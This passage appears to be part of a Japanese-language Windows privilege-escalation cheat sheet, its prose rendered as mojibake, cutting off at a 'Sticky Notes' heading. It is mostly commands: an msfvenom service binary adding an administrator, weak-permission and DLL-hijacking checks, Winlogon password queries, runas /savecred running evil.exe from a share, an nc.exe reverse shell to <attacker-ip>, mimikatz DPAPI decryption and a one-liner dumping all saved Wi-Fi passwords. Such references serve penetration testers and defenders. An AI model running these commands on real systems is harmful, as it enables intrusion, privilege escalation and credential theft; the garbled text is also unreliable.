**ã“ã®è„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¦æ‚ªç”¨**ã™ã‚‹ã«ã¯ã€metasploitã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š`exploit/windows/local/trusted\_service\_path` æ‰‹å‹•ã§metasploitã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ãƒã‚¤ãƒŠãƒªã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### ãƒªã‚«ãƒãƒªãƒ¼ã‚¢ã‚¯ã‚·ãƒ§ãƒ³

Windowsã§ã¯ã€ã‚µãƒ¼ãƒ“ã‚¹ãŒå¤±æ•—ã—ãŸå ´åˆã«å®Ÿè¡Œã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæŒ‡å®šã§ãã¾ã™ã€‚ã“ã®æ©Ÿèƒ½ã¯ãƒã‚¤ãƒŠãƒªã‚’æŒ‡ã™ã‚ˆã†ã«æ§‹æˆã§ãã¾ã™ã€‚ã“ã®ãƒã‚¤ãƒŠãƒªãŒç½®æ›å¯èƒ½ã§ã‚ã‚Œã°ã€ç‰¹æ¨©æ˜‡æ ¼ãŒå¯èƒ½ã«ãªã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚è©³ç´°ã¯[å…¬å¼ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã¾ã™ã€‚

## ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

### ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³

**ãƒã‚¤ãƒŠãƒªã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©**ï¼ˆä¸Šæ›¸ãã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã‚’è¡Œã†ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼‰ã¨**ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼**ã®ã‚¢ã‚¯ã‚»ã‚¹æ¨©ï¼ˆ[DLLãƒã‚¤ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°](dll-hijacking/)ï¼‰ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### æ›¸ãè¾¼ã¿æ¨©é™

ã‚·ã‚¹ãƒ†ãƒ å†…ã®å¼±ã„ãƒ•ã‚©ãƒ«ãƒ€/ãƒ•ã‚¡ã‚¤ãƒ«ã®æ¨©é™ã‚’è¦‹ã¤ã‘ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### ã‚¹ã‚¿ãƒ¼ãƒˆã‚¢ãƒƒãƒ—ã§å®Ÿè¡Œ

**ç•°ãªã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦å®Ÿè¡Œã•ã‚Œã‚‹ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã¾ãŸã¯ãƒã‚¤ãƒŠãƒªã‚’ä¸Šæ›¸ãã§ãã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¾ã™ã€‚**\
**æ¬¡ã®ãƒšãƒ¼ã‚¸**ã‚’**èª­ã‚“ã§**ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„**autorunsã®å ´æ‰€**ã«ã¤ã„ã¦è©³ã—ãçŸ¥ã‚‹ï¼š

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ãƒ‰ãƒ©ã‚¤ãƒãƒ¼

å¯èƒ½ãª**ã‚µãƒ¼ãƒ‰ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ¼ã®å¥‡å¦™ã§è„†å¼±ãª**ãƒ‰ãƒ©ã‚¤ãƒãƒ¼ã‚’æ¢ã—ã¾ã™
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°

ã‚‚ã—ã€**PATH ã«å­˜åœ¨ã™ã‚‹ãƒ•ã‚©ãƒ«ãƒ€å†…ã«æ›¸ãè¾¼ã¿æ¨©é™**ãŒã‚ã‚‹å ´åˆã€ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã£ã¦èª­ã¿è¾¼ã¾ã‚Œã‚‹ DLL ã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã—ã¦**ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

PATH å†…ã®ã™ã¹ã¦ã®ãƒ•ã‚©ãƒ«ãƒ€ã®æ¨©é™ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ï¼š
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
ä»¥ä¸‹ã¯ã€ã“ã®ãƒã‚§ãƒƒã‚¯ã‚’æ‚ªç”¨ã™ã‚‹æ–¹æ³•ã®è©³ç´°ã«ã¤ã„ã¦ã®æƒ…å ±ã§ã™ï¼š

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯

### å…±æœ‰
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### ãƒ›ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«

ãƒ›ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã«ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸä»–ã®æ—¢çŸ¥ã®ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
```
type C:\Windows\System32\drivers\etc\hosts
```
### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ï¼†DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### ã‚ªãƒ¼ãƒ—ãƒ³ãƒãƒ¼ãƒˆ

å¤–éƒ¨ã‹ã‚‰ã®**åˆ¶é™ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
```bash
netstat -ano #Opened ports?
```
### ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒ†ãƒ¼ãƒ–ãƒ«
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP ãƒ†ãƒ¼ãƒ–ãƒ«
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã®ãƒ«ãƒ¼ãƒ«

[**ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã«é–¢é€£ã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã«ã¤ã„ã¦ã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„**](../basic-cmd-for-pentesters.md#firewall) **(ãƒ«ãƒ¼ãƒ«ã®ãƒªã‚¹ãƒˆã€ãƒ«ãƒ¼ãƒ«ã®ä½œæˆã€ç„¡åŠ¹åŒ–ã€ç„¡åŠ¹åŒ–...)**

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™ã®ãŸã‚ã®[ãã®ä»–ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã“ã¡ã‚‰](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
ãƒã‚¤ãƒŠãƒªã® `bash.exe` ã¯ `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` ã«ã‚‚è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

root ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚‹ã¨ã€ä»»æ„ã®ãƒãƒ¼ãƒˆã§ãƒªãƒƒã‚¹ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆãƒãƒ¼ãƒˆã§ `nc.exe` ã‚’åˆã‚ã¦ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã«ã‚ˆã£ã¦ `nc` ãŒè¨±å¯ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’ GUI ã§å°‹ã­ã‚‰ã‚Œã¾ã™ï¼‰ã€‚
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
```
rootãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ç°¡å˜ã«bashã‚’èµ·å‹•ã™ã‚‹ã«ã¯ã€`--default-user root`ã‚’è©¦ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

`C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã§`WSL`ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’æ¢ç´¢ã§ãã¾ã™ã€‚

## Windowsã®è³‡æ ¼æƒ…å ±

### Winlogonã®è³‡æ ¼æƒ…å ±
```
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vaultã¯ã€**Windows**ãŒ**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è‡ªå‹•çš„ã«ãƒ­ã‚°ã‚¤ãƒ³**ã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚µãƒ¼ãƒãƒ¼ã€ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã€ãŠã‚ˆã³ä»–ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼è³‡æ ¼æƒ…å ±ã‚’æ ¼ç´ã—ã¾ã™ã€‚æœ€åˆã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã¯ã€ã“ã‚Œã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒFacebookã®è³‡æ ¼æƒ…å ±ã€Twitterã®è³‡æ ¼æƒ…å ±ã€Gmailã®è³‡æ ¼æƒ…å ±ãªã©ã‚’è‡ªå‹•çš„ã«ãƒ–ãƒ©ã‚¦ã‚¶çµŒç”±ã§ãƒ­ã‚°ã‚¤ãƒ³ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã®ã‚ˆã†ã«è¦‹ãˆã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ãŒã€å®Ÿéš›ã«ã¯ãã†ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚

Windows Vaultã¯ã€WindowsãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è‡ªå‹•çš„ã«ãƒ­ã‚°ã‚¤ãƒ³ã•ã›ã‚‹ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’æ ¼ç´ã—ã€ã¤ã¾ã‚Šã€**ãƒªã‚½ãƒ¼ã‚¹ï¼ˆã‚µãƒ¼ãƒãƒ¼ã¾ãŸã¯ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«è³‡æ ¼æƒ…å ±ãŒå¿…è¦ãªWindowsã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æ¯å›å…¥åŠ›ã™ã‚‹ä»£ã‚ã‚Šã«æä¾›ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒè³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã¨ã‚„ã‚Šå–ã‚Šã—ãªã„é™ã‚Šã€ç‰¹å®šã®ãƒªã‚½ãƒ¼ã‚¹ã®è³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã¯ã§ããªã„ã¨æ€ã„ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒVaultã‚’åˆ©ç”¨ã™ã‚‹å ´åˆã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸Vaultã‹ã‚‰ãã®ãƒªã‚½ãƒ¼ã‚¹ã®è³‡æ ¼æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã¨ä½•ã‚‰ã‹ã®æ–¹æ³•ã§**é€šä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚

`cmdkey`ã‚’ä½¿ç”¨ã—ã¦ã€ãƒã‚·ãƒ³ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹è³‡æ ¼æƒ…å ±ã‚’ãƒªã‚¹ãƒˆã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
æ¬¡ã«ã€ä¿å­˜ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«`runas`ã‚’`/savecred`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã¨ã¨ã‚‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚æ¬¡ã®ä¾‹ã¯ã€SMBå…±æœ‰ã‚’ä»‹ã—ã¦ãƒªãƒ¢ãƒ¼ãƒˆãƒã‚¤ãƒŠãƒªã‚’å‘¼ã³å‡ºã—ã¦ã„ã¾ã™ã€‚
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`ã‚’ä½¿ç”¨ã—ã¦æä¾›ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚mimikatzã€lazagneã€[credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html)ã€[VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html)ã€ã¾ãŸã¯[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1)ã‹ã‚‰æƒ…å ±ã‚’å–å¾—ã§ãã¾ã™ã€‚

### DPAPI

**Data Protection API (DPAPI)** ã¯ã€ãƒ‡ãƒ¼ã‚¿ã®å¯¾ç§°æš—å·åŒ–ã®ãŸã‚ã®æ‰‹æ³•ã‚’æä¾›ã—ã€ä¸»ã«Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ å†…ã§éå¯¾ç§°ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã®å¯¾ç§°æš—å·åŒ–ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®æš—å·åŒ–ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¾ãŸã¯ã‚·ã‚¹ãƒ†ãƒ ã®ç§˜å¯†ã‚’ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ã«å¤§ããå¯„ä¸ã•ã›ã¾ã™ã€‚

**DPAPIã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ­ã‚°ã‚¤ãƒ³ç§˜å¯†ã‹ã‚‰æ´¾ç”Ÿã—ãŸå¯¾ç§°éµã‚’ä½¿ç”¨ã—ã¦ã‚­ãƒ¼ã‚’æš—å·åŒ–ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™**ã€‚ã‚·ã‚¹ãƒ†ãƒ æš—å·åŒ–ã‚’å«ã‚€ã‚·ãƒŠãƒªã‚ªã§ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã®ãƒ‰ãƒ¡ã‚¤ãƒ³èªè¨¼ç§˜å¯†ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚

DPAPIã‚’ä½¿ç”¨ã—ã¦æš—å·åŒ–ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼RSAã‚­ãƒ¼ã¯ã€`%APPDATA%\Microsoft\Protect\{SID}`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã“ã“ã§`{SID}`ã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®[ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è­˜åˆ¥å­](https://en.wikipedia.org/wiki/Security\_Identifier)ã‚’è¡¨ã—ã¾ã™ã€‚**DPAPIã‚­ãƒ¼ã¯ã€é€šå¸¸64ãƒã‚¤ãƒˆã®ãƒ©ãƒ³ãƒ€ãƒ ãƒ‡ãƒ¼ã‚¿ã§æ§‹æˆã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆã‚­ãƒ¼ã‚’ä¿è­·ã™ã‚‹ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼ã¨åŒã˜ãƒ•ã‚¡ã‚¤ãƒ«ã«æ ¼ç´ã•ã‚Œã¦ã„ã¾ã™**ã€‚ï¼ˆã“ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯åˆ¶é™ã•ã‚Œã¦ãŠã‚Šã€CMDã®`dir`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãã®å†…å®¹ã‚’ãƒªã‚¹ãƒˆè¡¨ç¤ºã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ãŒã€PowerShellã‚’ä»‹ã—ã¦ãƒªã‚¹ãƒˆè¡¨ç¤ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
ä»¥ä¸‹ã¯ã€é©åˆ‡ãªå¼•æ•°ï¼ˆ`/pvk`ã¾ãŸã¯`/rpc`ï¼‰ã‚’ä½¿ç”¨ã—ã¦ã€**mimikatzãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«** `dpapi::masterkey`ã‚’ä½¿ç”¨ã—ã¦å¾©å·åŒ–ã§ãã¾ã™ã€‚

é€šå¸¸ã€**ãƒã‚¹ã‚¿ãƒ¼ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ãƒ•ã‚¡ã‚¤ãƒ«**ã¯æ¬¡ã®å ´æ‰€ã«ã‚ã‚Šã¾ã™ï¼š
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
**mimikatzãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«** `dpapi::cred` ã‚’é©åˆ‡ãª `/masterkey` ã¨å…±ã«ä½¿ç”¨ã—ã¦å¾©å·åŒ–ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`sekurlsa::dpapi` ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ï¼ˆrootæ¨©é™ã§ã‚ã‚Œã°ï¼‰ã€**ãƒ¡ãƒ¢ãƒª**ã‹ã‚‰**å¤šãã®DPAPI** **ãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼**ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShellè³‡æ ¼æƒ…å ±

**PowerShellè³‡æ ¼æƒ…å ±** ã¯ã€ã—ã°ã—ã°**ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚„è‡ªå‹•åŒ–ã‚¿ã‚¹ã‚¯ã§ä½¿ç”¨ã•ã‚Œã€æš—å·åŒ–ã•ã‚ŒãŸè³‡æ ¼æƒ…å ±ã‚’ä¾¿åˆ©ã«ä¿å­˜ã™ã‚‹æ‰‹æ®µã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®è³‡æ ¼æƒ…å ±ã¯é€šå¸¸ã€**DPAPI** ã‚’ä½¿ç”¨ã—ã¦ä¿è­·ã•ã‚Œã¦ãŠã‚Šã€é€šå¸¸ã¯ä½œæˆã•ã‚ŒãŸã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ä¸Šã®åŒã˜ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã£ã¦ã®ã¿å¾©å·åŒ–ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

ãƒ•ã‚¡ã‚¤ãƒ«ã«å«ã¾ã‚Œã‚‹PSè³‡æ ¼æƒ…å ±ã‚’å¾©å·åŒ–ã™ã‚‹ã«ã¯ã€ä»¥ä¸‹ã®æ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi

### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### ä¿å­˜ã•ã‚ŒãŸRDPæ¥ç¶š

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ãã—ã¦`HKCU\Software\Microsoft\Terminal Server Client\Servers\`å†…ã«ã‚‚ã‚ã‚Šã¾ã™ã€‚

### æœ€è¿‘å®Ÿè¡Œã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—è³‡æ ¼æƒ…å ±ãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
**Mimikatz**ã®`dpapi::rdg`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’é©åˆ‡ãª`/masterkey`ã¨å…±ã«ä½¿ç”¨ã—ã¦ã€**.rdgãƒ•ã‚¡ã‚¤ãƒ«ã‚’å¾©å·åŒ–**ã—ã¾ã™ã€‚\
Mimikatzã®`sekurlsa::dpapi`ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ¡ãƒ¢ãƒªã‹ã‚‰**å¤šãã®DPAPIãƒã‚¹ã‚¿ãƒ¼ã‚­ãƒ¼**ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚

### Sticky Notes

